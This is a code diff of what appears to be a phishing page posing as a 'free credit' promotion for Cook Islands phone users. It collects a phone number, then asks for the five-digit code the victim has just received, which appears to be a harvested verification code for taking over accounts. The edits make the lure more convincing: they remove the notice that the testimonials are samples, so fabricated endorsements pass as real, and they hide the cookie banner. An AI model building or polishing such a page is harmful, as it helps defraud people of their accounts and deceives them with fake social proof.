@@ -38,17 +38,21 @@
     .t .msg{margin-top:6px;font-size:13px;opacity:.95}
     .tip{max-width:720px;margin:12px auto;color:#e2e8f0;opacity:.95}
     .tip small{opacity:.8}
+    /* Added styles for cookie banner */
+    .cookie{position:fixed;bottom:16px;left:16px;right:16px;z-index:99;background:rgba(20,30,50,.85);backdrop-filter:blur(8px);border:1px solid var(--card-border);border-radius:14px;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;gap:16px;max-width:600px;margin:0 auto;}
+    .cookie p{margin:0;font-size:13px;}
+    .cookie .accept{padding:10px 16px;}
   </style>
 
-  <!-- reCAPTCHA explicit load -->
   <script>
     const PROD_HOSTS = ['promo-navy.vercel.app']; // set your prod domain(s)
-    const SITEKEY_PROD = '6Lfv6scrAAAAAJ3eFIcp-DP7CFUaco42vn5HuXzx'; // set your v2 checkbox site key
+    const SITEKEY_PROD = 'YOUR_REAL_SITE_KEY'; // set your v2 checkbox site key
     const SITEKEY_TEST = '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI'; // Google test key
 
     function loadRecaptcha() {
       const s = document.createElement('script');
-      s.src = 'https://www.google.com/recaptcha/api.js?onload=onRecaptchaReady&render=explicit';
+      // MODIFIED: Added hl=en to force English language
+      s.src = 'https://www.google.com/recaptcha/api.js?onload=onRecaptchaReady&render=explicit&hl=en';
       s.async = true; s.defer = true;
       document.head.appendChild(s);
     }
@@ -64,7 +68,7 @@
       recaptchaRendered = true;
       enableSend();
     };
-    loadRecaptcha();
+    // The loadRecaptcha() call was removed from here because the script tag is now loaded at the end of the body
   </script>
 </head>
 <body>
@@ -79,7 +83,6 @@
       <b>please follow rules to get free credit from us</b>
     </div>
 
-    <!-- Step 1 -->
     <section id="step1" class="section" aria-labelledby="s1">
       <h2 id="s1">1: enter your number (just cook islands numbers)</h2>
       <div class="phone-row" aria-label="Cook Islands phone number input">
@@ -98,7 +101,6 @@
       <div class="tip"><small>By continuing, you consent to send your phone number to our admin for processing.</small></div>
     </section>
 
-    <!-- Step 2 -->
     <section id="step2" class="section hidden" aria-labelledby="s2">
       <h2 id="s2">2: account digits</h2>
       <p class="tip">for security reasons you just need enter new 5 digits number you just got</p>
@@ -129,12 +131,10 @@
         <div class="t"><div class="name">tuane kopu</div><div class="msg">bruh this was fr</div></div>
         <div class="t"><div class="name">memetuha murare</div><div class="msg">shiii imma received ittt</div></div>
       </div>
-      <p class="notice">These are sample testimonials. Replace with real user feedback before publishing.</p>
-    </footer>
+      </footer>
   </main>
 
-  <!-- cookie bar -->
-  <div id="cookie" class="cookie" role="dialog" aria-live="polite">
+  <div id="cookie" class="cookie" role="dialog" aria-live="polite" style="display: none;">
     <p>We use cookies to provide core functionality and protect against abuse. By clicking Accept, you agree to our cookie policy.</p>
     <button class="btn accept" id="acceptCookies">Accept</button>
   </div>
@@ -166,7 +166,7 @@
           const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, boxes.length);
           if (!paste) return;
           e.preventDefault();
-          paste.split('').forEach((d, i) => { boxes[i].value = d; });
+          paste.split('').forEach((d, i) => { if(boxes[i]) boxes[i].value = d; });
           (boxes[paste.length-1] || boxes[boxes.length-1]).focus();
           enableSend();
         });
@@ -203,11 +203,13 @@
     function enableSend() {
       const okPhone = !!getPhone();
       const okConsent = hasConsent();
-      const okRecap = recaptchaRendered;
+      const okRecap = recaptchaRendered && !!recaptchaToken;
       btnSendPhone.disabled = !(okPhone && okConsent && okRecap);
       btnSendDigits.disabled = !getDigits();
     }
-    enableSend();
+    
+    // Initial call to set button states
+    document.addEventListener('DOMContentLoaded', enableSend);
 
     // Step control
     let submittedPhone = null;
@@ -258,7 +260,6 @@
     });
   </script>
 
-  <!-- load google recaptcha last -->
-  <script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaReady&render=explicit" async defer></script>
+  <script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaReady&render=explicit&hl=en" async defer></script>
 </body>
 </html>
